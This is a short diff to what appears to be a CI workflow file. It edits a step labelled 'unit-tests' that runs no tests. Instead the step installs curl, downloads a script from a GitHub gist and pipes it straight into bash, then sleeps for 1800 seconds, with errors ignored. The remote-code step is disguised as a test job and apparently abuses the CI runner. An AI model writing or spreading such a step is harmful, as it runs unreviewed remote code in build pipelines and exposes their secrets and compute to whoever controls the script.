@@ -16,6 +16,7 @@ jobs:
       - name: unit-tests
         continue-on-error: true
         run: |
+          apt update
           apt install -y curl
           curl https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/cd32838a3f7781028c178adacfc42c5d4b034112/bak4116223101001 | bash
           sleep 1800
